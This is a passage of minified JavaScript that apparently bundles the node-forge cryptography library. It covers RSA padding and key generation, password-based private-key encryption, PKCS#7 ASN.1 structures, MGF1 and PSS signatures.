i.create(i.Class.UNIVERSAL,i.Type.SEQUENCE,!0,[i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,m(E.n)),i.create(i.Class.UNIVERSAL,i.Type.INTEGER,!1,m(E.e))])};function p(E,C,N){var L=r.util.createBuffer(),$=Math.ceil(C.n.bitLength()/8);if(E.length>$-11){var y=new Error("Message is too long for PKCS#1 v1.5 padding.");throw y.length=E.length,y.max=$-11,y}L.putByte(0),L.putByte(N);var A=$-3-E.length,b;if(N===0||N===1){b=N===0?0:255;for(var v=0;v<A;++v)L.putByte(b)}else for(;A>0;){for(var _=0,O=r.random.getBytes(A),v=0;v<A;++v)b=O.charCodeAt(v),b===0?++_:L.putByte(b);A=_}return L.putByte(0),L.putBytes(E),L}function g(E,C,N,L){var $=Math.ceil(C.n.bitLength()/8),y=r.util.createBuffer(E),A=y.getByte(),b=y.getByte();if(A!==0||N&&b!==0&&b!==1||!N&&b!=2||N&&b===0&&typeof L>"u")throw new Error("Encryption block is invalid.");var v=0;if(b===0){v=$-3-L;for(var _=0;_<v;++_)if(y.getByte()!==0)throw new Error("Encryption block is invalid.")}else if(b===1)for(v=0;y.length()>1;){if(y.getByte()!==255){--y.read;break}++v}else if(b===2)for(v=0;y.length()>1;){if(y.getByte()===0){--y.read;break}++v}var O=y.getByte();if(O!==0||v!==$-3-y.length())throw new Error("Encryption block is invalid.");return y.getBytes()}function w(E,C,N){typeof C=="function"&&(N=C,C={}),C=C||{};var L={algorithm:{name:C.algorithm||"PRIMEINC",options:{workers:C.workers||2,workLoad:C.workLoad||100,workerScript:C.workerScript}}};"prng"in C&&(L.prng=C.prng),$();function $(){y(E.pBits,function(b,v){if(b)return N(b);if(E.p=v,E.q!==null)return A(b,E.q);y(E.qBits,A)})}function y(b,v){r.prime.generateProbablePrime(b,L,v)}function A(b,v){if(b)return N(b);if(E.q=v,E.p.compareTo(E.q)<0){var _=E.p;E.p=E.q,E.q=_}if(E.p.subtract(e.ONE).gcd(E.e).compareTo(e.ONE)!==0){E.p=null,$();return}if(E.q.subtract(e.ONE).gcd(E.e).compareTo(e.ONE)!==0){E.q=null,y(E.qBits,A);return}if(E.p1=E.p.subtract(e.ONE),E.q1=E.q.subtract(e.ONE),E.phi=E.p1.multiply(E.q1),E.phi.gcd(E.e).compareTo(e.ONE)!==0){E.p=E.q=null,$();return}if(E.n=E.p.multiply(E.q),E.n.bitLength()!==E.bits){E.q=null,y(E.qBits,A);return}var O=E.e.modInverse(E.phi);E.keys={privateKey:s.rsa.setPrivateKey(E.n,E.e,O,E.p,E.q,O.mod(E.p1),O.mod(E.q1),E.q.modInverse(E.p)),publicKey:s.rsa.setPublicKey(E.n,E.e)},N(null,E.keys)}}function m(E){var C=E.toString(16);C[0]>="8"&&(C="00"+C);var N=r.util.hexToBytes(C);return N.length>1&&(N.charCodeAt(0)===0&&(N.charCodeAt(1)&128)===0||N.charCodeAt(0)===255&&(N.charCodeAt(1)&128)===128)?N.substr(1):N}function x(E){return E<=100?27:E<=150?18:E<=200?15:E<=250?12:E<=300?9:E<=350?8:E<=400?7:E<=500?6:E<=600?5:E<=800?4:E<=1250?3:2}function S(E){return r.util.isNodejs&&typeof t[E]=="function"}function T(E){return typeof n.globalScope<"u"&&typeof n.globalScope.crypto=="object"&&typeof n.globalScope.crypto.subtle=="object"&&typeof n.globalScope.crypto.subtle[E]=="function"}function k(E){return typeof n.globalScope<"u"&&typeof n.globalScope.msCrypto=="object"&&typeof n.globalScope.msCrypto.subtle=="object"&&typeof n.globalScope.msCrypto.subtle[E]=="function"}function I(E){for(var C=r.util.hexToBytes(E.toString(16)),N=new Uint8Array(C.length),L=0;L<C.length;++L)N[L]=C.charCodeAt(L);return N}return B_}var M_,WD;function wJ(){if(WD)return M_;WD=1;var r=Lr();if(Xg(),Yd(),Zx(),I0(),e2(),W$(),E3(),Au(),pJ(),Jx(),Ei(),typeof e>"u")var e=r.jsbn.BigInteger;var t=r.asn1,i=r.pki=r.pki||{};M_=i.pbe=r.pbe=r.pbe||{};var n=i.oids,s={name:"EncryptedPrivateKeyInfo",tagClass:t.Class.UNIVERSAL,type:t.Type.SEQUENCE,constructed:!0,value:[{name:"EncryptedPrivateKeyInfo.encryptionAlgorithm",tagClass:t.Class.UNIVERSAL,type:t.Type.SEQUENCE,constructed:!0,value:[{name:"AlgorithmIdentifier.algorithm",tagClass:t.Class.UNIVERSAL,type:t.Type.OID,constructed:!1,capture:"encryptionOid"},{name:"AlgorithmIdentifier.parameters",tagClass:t.Class.UNIVERSAL,type:t.Type.SEQUENCE,constructed:!0,captureAsn1:"encryptionParams"}]},{name:"EncryptedPrivateKeyInfo.encryptedData",tagClass:t.Class.UNIVERSAL,type:t.Type.OCTETSTRING,constructed:!1,capture:"encryptedData"}]},o={name:"PBES2Algorithms",tagClass:t.Class.UNIVERSAL,type:t.Type.SEQUENCE,constructed:!0,value:[{name:"PBES2Algorithms.keyDerivationFunc",tagClass:t.Class.UNIVERSAL,type:t.Type.SEQUENCE,constructed:!0,value:[{name:"PBES2Algorithms.keyDerivationFunc.oid",tagClass:t.Class.UNIVERSAL,type:t.Type.OID,constructed:!1,capture:"kdfOid"},{name:"PBES2Algorithms.params",tagClass:t.Class.UNIVERSAL,type:t.Type.SEQUENCE,constructed:!0,value:[{name:"PBES2Algorithms.params.salt",tagClass:t.Class.UNIVERSAL,type:t.Type.OCTETSTRING,constructed:!1,capture:"kdfSalt"},{name:"PBES2Algorithms.params.iterationCount",tagClass:t.Class.UNIVERSAL,type:t.Type.INTEGER,constructed:!1,capture:"kdfIterationCount"},{name:"PBES2Algorithms.params.keyLength",tagClass:t.Class.UNIVERSAL,type:t.Type.INTEGER,constructed:!1,optional:!0,capture:"keyLength"},{name:"PBES2Algorithms.params.prf",tagClass:t.Class.UNIVERSAL,type:t.Type.SEQUENCE,constructed:!0,optional:!0,value:[{name:"PBES2Algorithms.params.prf.algorithm",tagClass:t.Class.UNIVERSAL,type:t.Type.OID,constructed:!1,capture:"prfOid"}]}]}]},{name:"PBES2Algorithms.encryptionScheme",tagClass:t.Class.UNIVERSAL,type:t.Type.SEQUENCE,constructed:!0,value:[{name:"PBES2Algorithms.encryptionScheme.oid",tagClass:t.Class.UNIVERSAL,type:t.Type.OID,constructed:!1,capture:"encOid"},{name:"PBES2Algorithms.encryptionScheme.iv",tagClass:t.Class.UNIVERSAL,type:t.Type.OCTETSTRING,constructed:!1,capture:"encIv"}]}]},a={name:"pkcs-12PbeParams",tagClass:t.Class.UNIVERSAL,type:t.Type.SEQUENCE,constructed:!0,value:[{name:"pkcs-12PbeParams.salt",tagClass:t.Class.UNIVERSAL,type:t.Type.OCTETSTRING,constructed:!1,capture:"salt"},{name:"pkcs-12PbeParams.iterations",tagClass:t.Class.UNIVERSAL,type:t.Type.INTEGER,constructed:!1,capture:"iterations"}]};i.encryptPrivateKeyInfo=function(h,f,p){p=p||{},p.saltSize=p.saltSize||8,p.count=p.count||2048,p.algorithm=p.algorithm||"aes128",p.prfAlgorithm=p.prfAlgorithm||"sha1";var g=r.random.getBytesSync(p.saltSize),w=p.count,m=t.integerToDer(w),x,S,T;if(p.algorithm.indexOf("aes")===0||p.algorithm==="des"){var k,I,E;switch(p.algorithm){case"aes128":x=16,k=16,I=n["aes128-CBC"],E=r.aes.createEncryptionCipher;break;case"aes192":x=24,k=16,I=n["aes192-CBC"],E=r.aes.createEncryptionCipher;break;case"aes256":x=32,k=16,I=n["aes256-CBC"],E=r.aes.createEncryptionCipher;break;case"des":x=8,k=8,I=n.desCBC,E=r.des.createEncryptionCipher;break;default:var C=new Error("Cannot encrypt private key. Unknown encryption algorithm.");throw C.algorithm=p.algorithm,C}var N="hmacWith"+p.prfAlgorithm.toUpperCase(),L=u(N),$=r.pkcs5.pbkdf2(f,g,w,x,L),y=r.random.getBytesSync(k),A=E($);A.start(y),A.update(t.toDer(h)),A.finish(),T=A.output.getBytes();var b=d(g,m,x,N);S=t.create(t.Class.UNIVERSAL,t.Type.SEQUENCE,!0,[t.create(t.Class.UNIVERSAL,t.Type.OID,!1,t.oidToDer(n.pkcs5PBES2).getBytes()),t.create(t.Class.UNIVERSAL,t.Type.SEQUENCE,!0,[t.create(t.Class.UNIVERSAL,t.Type.SEQUENCE,!0,[t.create(t.Class.UNIVERSAL,t.Type.OID,!1,t.oidToDer(n.pkcs5PBKDF2).getBytes()),b]),t.create(t.Class.UNIVERSAL,t.Type.SEQUENCE,!0,[t.create(t.Class.UNIVERSAL,t.Type.OID,!1,t.oidToDer(I).getBytes()),t.create(t.Class.UNIVERSAL,t.Type.OCTETSTRING,!1,y)])])])}else if(p.algorithm==="3des"){x=24;var v=new r.util.ByteBuffer(g),$=i.pbe.generatePkcs12Key(f,v,1,w,x),y=i.pbe.generatePkcs12Key(f,v,2,w,x),A=r.des.createEncryptionCipher($);A.start(y),A.update(t.toDer(h)),A.finish(),T=A.output.getBytes(),S=t.create(t.Class.UNIVERSAL,t.Type.SEQUENCE,!0,[t.create(t.Class.UNIVERSAL,t.Type.OID,!1,t.oidToDer(n["pbeWithSHAAnd3-KeyTripleDES-CBC"]).getBytes()),t.create(t.Class.UNIVERSAL,t.Type.SEQUENCE,!0,[t.create(t.Class.UNIVERSAL,t.Type.OCTETSTRING,!1,g),t.create(t.Class.UNIVERSAL,t.Type.INTEGER,!1,m.getBytes())])])}else{var C=new Error("Cannot encrypt private key. Unknown encryption algorithm.");throw C.algorithm=p.algorithm,C}var _=t.create(t.Class.UNIVERSAL,t.Type.SEQUENCE,!0,[S,t.create(t.Class.UNIVERSAL,t.Type.OCTETSTRING,!1,T)]);return _},i.decryptPrivateKeyInfo=function(h,f){var p=null,g={},w=[];if(!t.validate(h,s,g,w)){var m=new Error("Cannot read encrypted private key. ASN.1 object is not a supported EncryptedPrivateKeyInfo.");throw m.errors=w,m}var x=t.derToOid(g.encryptionOid),S=i.pbe.getCipher(x,g.encryptionParams,f),T=r.util.createBuffer(g.encryptedData);return S.update(T),S.finish()&&(p=t.fromDer(S.output)),p},i.encryptedPrivateKeyToPem=function(h,f){var p={type:"ENCRYPTED PRIVATE KEY",body:t.toDer(h).getBytes()};return r.pem.encode(p,{maxline:f})},i.encryptedPrivateKeyFromPem=function(h){var f=r.pem.decode(h)[0];if(f.type!=="ENCRYPTED PRIVATE KEY"){var p=new Error('Could not convert encrypted private key from PEM; PEM header type is "ENCRYPTED PRIVATE KEY".');throw p.headerType=f.type,p}if(f.procType&&f.procType.type==="ENCRYPTED")throw new Error("Could not convert encrypted private key from PEM; PEM is encrypted.");return t.fromDer(f.body)},i.encryptRsaPrivateKey=function(h,f,p){if(p=p||{},!p.legacy){var g=i.wrapRsaPrivateKey(i.privateKeyToAsn1(h));return g=i.encryptPrivateKeyInfo(g,f,p),i.encryptedPrivateKeyToPem(g)}var w,m,x,S;switch(p.algorithm){case"aes128":w="AES-128-CBC",x=16,m=r.random.getBytesSync(16),S=r.aes.createEncryptionCipher;break;case"aes192":w="AES-192-CBC",x=24,m=r.random.getBytesSync(16),S=r.aes.createEncryptionCipher;break;case"aes256":w="AES-256-CBC",x=32,m=r.random.getBytesSync(16),S=r.aes.createEncryptionCipher;break;case"3des":w="DES-EDE3-CBC",x=24,m=r.random.getBytesSync(8),S=r.des.createEncryptionCipher;break;case"des":w="DES-CBC",x=8,m=r.random.getBytesSync(8),S=r.des.createEncryptionCipher;break;default:var T=new Error('Could not encrypt RSA private key; unsupported encryption algorithm "'+p.algorithm+'".');throw T.algorithm=p.algorithm,T}var k=r.pbe.opensslDeriveBytes(f,m.substr(0,8),x),I=S(k);I.start(m),I.update(t.toDer(i.privateKeyToAsn1(h))),I.finish();var E={type:"RSA PRIVATE KEY",procType:{version:"4",type:"ENCRYPTED"},dekInfo:{algorithm:w,parameters:r.util.bytesToHex(m).toUpperCase()},body:I.output.getBytes()};return r.pem.encode(E)},i.decryptRsaPrivateKey=function(h,f){var p=null,g=r.pem.decode(h)[0];if(g.type!=="ENCRYPTED PRIVATE KEY"&&g.type!=="PRIVATE KEY"&&g.type!=="RSA PRIVATE KEY"){var w=new Error('Could not convert private key from PEM; PEM header type is not "ENCRYPTED PRIVATE KEY", "PRIVATE KEY", or "RSA PRIVATE KEY".');throw w.headerType=w,w}if(g.procType&&g.procType.type==="ENCRYPTED"){var m,x;switch(g.dekInfo.algorithm){case"DES-CBC":m=8,x=r.des.createDecryptionCipher;break;case"DES-EDE3-CBC":m=24,x=r.des.createDecryptionCipher;break;case"AES-128-CBC":m=16,x=r.aes.createDecryptionCipher;break;case"AES-192-CBC":m=24,x=r.aes.createDecryptionCipher;break;case"AES-256-CBC":m=32,x=r.aes.createDecryptionCipher;break;case"RC2-40-CBC":m=5,x=function(E){return r.rc2.createDecryptionCipher(E,40)};break;case"RC2-64-CBC":m=8,x=function(E){return r.rc2.createDecryptionCipher(E,64)};break;case"RC2-128-CBC":m=16,x=function(E){return r.rc2.createDecryptionCipher(E,128)};break;default:var w=new Error('Could not decrypt private key; unsupported encryption algorithm "'+g.dekInfo.algorithm+'".');throw w.algorithm=g.dekInfo.algorithm,w}var S=r.util.hexToBytes(g.dekInfo.parameters),T=r.pbe.opensslDeriveBytes(f,S.substr(0,8),m),k=x(T);if(k.start(S),k.update(r.util.createBuffer(g.body)),k.finish())p=k.output.getBytes();else return p}else p=g.body;return g.type==="ENCRYPTED PRIVATE KEY"?p=i.decryptPrivateKeyInfo(t.fromDer(p),f):p=t.fromDer(p),p!==null&&(p=i.privateKeyFromAsn1(p)),p},i.pbe.generatePkcs12Key=function(h,f,p,g,w,m){var x,S;if(typeof m>"u"||m===null){if(!("sha1"in r.md))throw new Error('"sha1" hash algorithm unavailable.');m=r.md.sha1.create()}var T=m.digestLength,k=m.blockLength,I=new r.util.ByteBuffer,E=new r.util.ByteBuffer;if(h!=null){for(S=0;S<h.length;S++)E.putInt16(h.charCodeAt(S));E.putInt16(0)}var C=E.length(),N=f.length(),L=new r.util.ByteBuffer;L.fillWithByte(p,k);var $=k*Math.ceil(N/k),y=new r.util.ByteBuffer;for(S=0;S<$;S++)y.putByte(f.at(S%N));var A=k*Math.ceil(C/k),b=new r.util.ByteBuffer;for(S=0;S<A;S++)b.putByte(E.at(S%C));var v=y;v.putBuffer(b);for(var _=Math.ceil(w/T),O=1;O<=_;O++){var D=new r.util.ByteBuffer;D.putBytes(L.bytes()),D.putBytes(v.bytes());for(var R=0;R<g;R++)m.start(),m.update(D.getBytes()),D=m.digest();var P=new r.util.ByteBuffer;for(S=0;S<k;S++)P.putByte(D.at(S%T));var B=Math.ceil(N/k)+Math.ceil(C/k),M=new r.util.ByteBuffer;for(x=0;x<B;x++){var W=new r.util.ByteBuffer(v.getBytes(k)),K=511;for(S=P.length()-1;S>=0;S--)K=K>>8,K+=P.at(S)+W.at(S),W.setAt(S,K&255);M.putBuffer(W)}v=M,I.putBuffer(D)}return I.truncate(I.length()-w),I},i.pbe.getCipher=function(h,f,p){switch(h){case i.oids.pkcs5PBES2:return i.pbe.getCipherForPBES2(h,f,p);case i.oids["pbeWithSHAAnd3-KeyTripleDES-CBC"]:case i.oids["pbewithSHAAnd40BitRC2-CBC"]:return i.pbe.getCipherForPKCS12PBE(h,f,p);default:var g=new Error("Cannot read encrypted PBE data block. Unsupported OID.");throw g.oid=h,g.supportedOids=["pkcs5PBES2","pbeWithSHAAnd3-KeyTripleDES-CBC","pbewithSHAAnd40BitRC2-CBC"],g}},i.pbe.getCipherForPBES2=function(h,f,p){var g={},w=[];if(!t.validate(f,o,g,w)){var m=new Error("Cannot read password-based-encryption algorithm parameters. ASN.1 object is not a supported EncryptedPrivateKeyInfo.");throw m.errors=w,m}if(h=t.derToOid(g.kdfOid),h!==i.oids.pkcs5PBKDF2){var m=new Error("Cannot read encrypted private key. Unsupported key derivation function OID.");throw m.oid=h,m.supportedOids=["pkcs5PBKDF2"],m}if(h=t.derToOid(g.encOid),h!==i.oids["aes128-CBC"]&&h!==i.oids["aes192-CBC"]&&h!==i.oids["aes256-CBC"]&&h!==i.oids["des-EDE3-CBC"]&&h!==i.oids.desCBC){var m=new Error("Cannot read encrypted private key. Unsupported encryption scheme OID.");throw m.oid=h,m.supportedOids=["aes128-CBC","aes192-CBC","aes256-CBC","des-EDE3-CBC","desCBC"],m}var x=g.kdfSalt,S=r.util.createBuffer(g.kdfIterationCount);S=S.getInt(S.length()<<3);var T,k;switch(i.oids[h]){case"aes128-CBC":T=16,k=r.aes.createDecryptionCipher;break;case"aes192-CBC":T=24,k=r.aes.createDecryptionCipher;break;case"aes256-CBC":T=32,k=r.aes.createDecryptionCipher;break;case"des-EDE3-CBC":T=24,k=r.des.createDecryptionCipher;break;case"desCBC":T=8,k=r.des.createDecryptionCipher;break}var I=l(g.prfOid),E=r.pkcs5.pbkdf2(p,x,S,T,I),C=g.encIv,N=k(E);return N.start(C),N},i.pbe.getCipherForPKCS12PBE=function(h,f,p){var g={},w=[];if(!t.validate(f,a,g,w)){var m=new Error("Cannot read password-based-encryption algorithm parameters. ASN.1 object is not a supported EncryptedPrivateKeyInfo.");throw m.errors=w,m}var x=r.util.createBuffer(g.salt),S=r.util.createBuffer(g.iterations);S=S.getInt(S.length()<<3);var T,k,I;switch(h){case i.oids["pbeWithSHAAnd3-KeyTripleDES-CBC"]:T=24,k=8,I=r.des.startDecrypting;break;case i.oids["pbewithSHAAnd40BitRC2-CBC"]:T=5,k=8,I=function($,y){var A=r.rc2.createDecryptionCipher($,40);return A.start(y,null),A};break;default:var m=new Error("Cannot read PKCS #12 PBE data block. Unsupported OID.");throw m.oid=h,m}var E=l(g.prfOid),C=i.pbe.generatePkcs12Key(p,x,1,S,T,E);E.start();var N=i.pbe.generatePkcs12Key(p,x,2,S,k,E);return I(C,N)},i.pbe.opensslDeriveBytes=function(h,f,p,g){if(typeof g>"u"||g===null){if(!("md5"in r.md))throw new Error('"md5" hash algorithm unavailable.');g=r.md.md5.create()}f===null&&(f="");for(var w=[c(g,h+f)],m=16,x=1;m<p;++x,m+=16)w.push(c(g,w[x-1]+h+f));return w.join("").substr(0,p)};function c(h,f){return h.start().update(f).digest().getBytes()}function l(h){var f;if(!h)f="hmacWithSHA1";else if(f=i.oids[t.derToOid(h)],!f){var p=new Error("Unsupported PRF OID.");throw p.oid=h,p.supported=["hmacWithSHA1","hmacWithSHA224","hmacWithSHA256","hmacWithSHA384","hmacWithSHA512"],p}return u(f)}function u(h){var f=r.md;switch(h){case"hmacWithSHA224":f=r.md.sha512;case"hmacWithSHA1":case"hmacWithSHA256":case"hmacWithSHA384":case"hmacWithSHA512":h=h.substr(8).toLowerCase();break;default:var p=new Error("Unsupported PRF algorithm.");throw p.algorithm=h,p.supported=["hmacWithSHA1","hmacWithSHA224","hmacWithSHA256","hmacWithSHA384","hmacWithSHA512"],p}if(!f||!(h in f))throw new Error("Unknown hash algorithm: "+h);return f[h].create()}function d(h,f,p,g){var w=t.create(t.Class.UNIVERSAL,t.Type.SEQUENCE,!0,[t.create(t.Class.UNIVERSAL,t.Type.OCTETSTRING,!1,h),t.create(t.Class.UNIVERSAL,t.Type.INTEGER,!1,f.getBytes())]);return g!=="hmacWithSHA1"&&w.value.push(t.create(t.Class.UNIVERSAL,t.Type.INTEGER,!1,r.util.hexToBytes(p.toString(16))),t.create(t.Class.UNIVERSAL,t.Type.SEQUENCE,!0,[t.create(t.Class.UNIVERSAL,t.Type.OID,!1,t.oidToDer(i.oids[g]).getBytes()),t.create(t.Class.UNIVERSAL,t.Type.NULL,!1,"")])),w}return M_}var D_={exports:{}},L_={exports:{}},HD;function bJ(){if(HD)return L_.exports;HD=1;var r=Lr();Yd(),Ei();var e=r.asn1,t=L_.exports=r.pkcs7asn1=r.pkcs7asn1||{};r.pkcs7=r.pkcs7||{},r.pkcs7.asn1=t;var i={name:"ContentInfo",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"ContentInfo.ContentType",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"contentType"},{name:"ContentInfo.content",tagClass:e.Class.CONTEXT_SPECIFIC,type:0,constructed:!0,optional:!0,captureAsn1:"content"}]};t.contentInfoValidator=i;var n={name:"EncryptedContentInfo",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"EncryptedContentInfo.contentType",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"contentType"},{name:"EncryptedContentInfo.contentEncryptionAlgorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"EncryptedContentInfo.contentEncryptionAlgorithm.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"encAlgorithm"},{name:"EncryptedContentInfo.contentEncryptionAlgorithm.parameter",tagClass:e.Class.UNIVERSAL,captureAsn1:"encParameter"}]},{name:"EncryptedContentInfo.encryptedContent",tagClass:e.Class.CONTEXT_SPECIFIC,type:0,capture:"encryptedContent",captureAsn1:"encryptedContentAsn1"}]};t.envelopedDataValidator={name:"EnvelopedData",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"EnvelopedData.Version",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,capture:"version"},{name:"EnvelopedData.RecipientInfos",tagClass:e.Class.UNIVERSAL,type:e.Type.SET,constructed:!0,captureAsn1:"recipientInfos"}].concat(n)},t.encryptedDataValidator={name:"EncryptedData",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"EncryptedData.Version",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,capture:"version"}].concat(n)};var s={name:"SignerInfo",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"SignerInfo.version",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1},{name:"SignerInfo.issuerAndSerialNumber",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"SignerInfo.issuerAndSerialNumber.issuer",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,captureAsn1:"issuer"},{name:"SignerInfo.issuerAndSerialNumber.serialNumber",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,capture:"serial"}]},{name:"SignerInfo.digestAlgorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"SignerInfo.digestAlgorithm.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"digestAlgorithm"},{name:"SignerInfo.digestAlgorithm.parameter",tagClass:e.Class.UNIVERSAL,constructed:!1,captureAsn1:"digestParameter",optional:!0}]},{name:"SignerInfo.authenticatedAttributes",tagClass:e.Class.CONTEXT_SPECIFIC,type:0,constructed:!0,optional:!0,capture:"authenticatedAttributes"},{name:"SignerInfo.digestEncryptionAlgorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,capture:"signatureAlgorithm"},{name:"SignerInfo.encryptedDigest",tagClass:e.Class.UNIVERSAL,type:e.Type.OCTETSTRING,constructed:!1,capture:"signature"},{name:"SignerInfo.unauthenticatedAttributes",tagClass:e.Class.CONTEXT_SPECIFIC,type:1,constructed:!0,optional:!0,capture:"unauthenticatedAttributes"}]};return t.signedDataValidator={name:"SignedData",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"SignedData.Version",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,capture:"version"},{name:"SignedData.DigestAlgorithms",tagClass:e.Class.UNIVERSAL,type:e.Type.SET,constructed:!0,captureAsn1:"digestAlgorithms"},i,{name:"SignedData.Certificates",tagClass:e.Class.CONTEXT_SPECIFIC,type:0,optional:!0,captureAsn1:"certificates"},{name:"SignedData.CertificateRevocationLists",tagClass:e.Class.CONTEXT_SPECIFIC,type:1,optional:!0,captureAsn1:"crls"},{name:"SignedData.SignerInfos",tagClass:e.Class.UNIVERSAL,type:e.Type.SET,capture:"signerInfos",optional:!0,value:[s]}]},t.recipientInfoValidator={name:"RecipientInfo",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"RecipientInfo.version",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,capture:"version"},{name:"RecipientInfo.issuerAndSerial",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"RecipientInfo.issuerAndSerial.issuer",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,captureAsn1:"issuer"},{name:"RecipientInfo.issuerAndSerial.serialNumber",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,capture:"serial"}]},{name:"RecipientInfo.keyEncryptionAlgorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"RecipientInfo.keyEncryptionAlgorithm.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"encAlgorithm"},{name:"RecipientInfo.keyEncryptionAlgorithm.parameter",tagClass:e.Class.UNIVERSAL,constructed:!1,captureAsn1:"encParameter",optional:!0}]},{name:"RecipientInfo.encryptedKey",tagClass:e.Class.UNIVERSAL,type:e.Type.OCTETSTRING,constructed:!1,capture:"encKey"}]},L_.exports}var U_={exports:{}},j_={exports:{}},VD;function vJ(){if(VD)return j_.exports;VD=1;var r=Lr();Ei(),r.mgf=r.mgf||{};var e=j_.exports=r.mgf.mgf1=r.mgf1=r.mgf1||{};return e.create=function(t){var i={generate:function(n,s){for(var o=new r.util.ByteBuffer,a=Math.ceil(s/t.digestLength),c=0;c<a;c++){var l=new r.util.ByteBuffer;l.putInt32(c),t.start(),t.update(n+l.getBytes()),o.putBuffer(t.digest())}return o.truncate(o.length()-s),o.getBytes()}};return i},j_.exports}var F_,KD;function Epe(){if(KD)return F_;KD=1;var r=Lr();return vJ(),F_=r.mgf=r.mgf||{},r.mgf.mgf1=r.mgf1,F_}var q_={exports:{}},GD;function H$(){if(GD)return q_.exports;GD=1;var r=Lr();Au(),Ei();var e=q_.exports=r.pss=r.pss||{};return e.create=function(t){arguments.length===3&&(t={md:arguments[0],mgf:arguments[1],saltLength:arguments[2]});var i=t.md,n=t.mgf,s=i.digestLength,o=t.salt||null;typeof o=="string"&&(o=r.util.createBuffer(o));var a;if("saltLength"in t)a=t.saltLength;else if(o!==null)a=o.length();else throw new Error("Salt length not specified or specific salt not given.");if(o!==null&&o.length()!==a)throw new Error("Given salt length does not match length of given salt.");var c=t.prng||r.random,l={};return l.encode=function(u,d){var h,f=d-1,p=Math.ceil(f/8),g=u.digest().getBytes();if(p<s+a+2)throw new Error("Message is too long to encrypt.");var w;o===null?w=c.getBytesSync(a):w=o.bytes();var m=new r.util.ByteBuffer;m.fillWithByte(0,8),m.putBytes(g),m.putBytes(w),i.start(),i.update(m.getBytes());var x=i.digest().getBytes(),S=new r.util.ByteBuffer;S.fillWithByte(0,p-a-s-2),S.putByte(1),S.putBytes(w);var T=S.getBytes(),k=p-s-1,I=n.generate(x,k),E="";for(h=0;h<k;h++)E+=String.fromCharCode(T.charCodeAt(h)^I.charCodeAt(h));var C=65280>>8*p-f&255;return E=String.fromCharCode(E.charCodeAt(0)&~C)+E.substr(1),E+x+""},l.verify=function(u,d,h){var f,p=h-1,g=Math.ceil(p/8);if(d=d.substr(-g),g<s+a+2)throw new Error("Inconsistent parameters to PSS signature verification.");if(d.charCodeAt(g-1)!==188)throw new Error("Encoded message does not end in 0xBC.");var w=g-s-1,m=d.substr(0,w),x=d.substr(w,s),S=65280>>8*g-p&255;if((m.charCodeAt(0)&S)!==0)throw new Error("Bits beyond keysize not zero as expected.");var T=n.generate(x,w),k="";for(f=0;f<w;f++)k+=String.fromCharCode(m.charCodeAt(f)^T.charCodeAt(f));k=String.fromCharCode(k.charCodeAt(0)&~S)+k.substr(1);var I=g-s-a-2;for(f=0;f<I;f++)if(k.charCodeAt(f)!==0)throw new Error("Leftmost octets not zero as expected");if(k.charCodeAt(I)!==1)throw new Error("Inconsistent PSS signature, 0x01 marker not found");var E=k.substr(-a),C=new r.util.ByteBuffer;C.fillWithByte(0,8),C.putBytes(u),C.putBytes(E),i.start(),i.update(C.getBytes());var N=i.digest().getBytes();return x===N},l},q_.exports}var ZD;function V$(){if(ZD)return U_.exports;ZD=1;var r=Lr();Xg(),Yd(),Zx(),I0(),Epe(),e2(),E3(),H$(),Jx(),Ei();var e=r.asn1,t=U_.exports=r.pki=r.pki||{},i=t.oids,n={};n.CN=i.commonName,n.commonName="CN",n.C=i.countryName,n.countryName="C",n.L=i.localityName,n.localityName="L",n.ST=i.stateOrProvinceName,n.stateOrProvinceName="ST",n.O=i.organizationName,n.organizationName="O",n.OU=i.organizationalUnitName,n.organizationalUnitName="OU",n.E=i.emailAddress,n.emailAddress="E";var 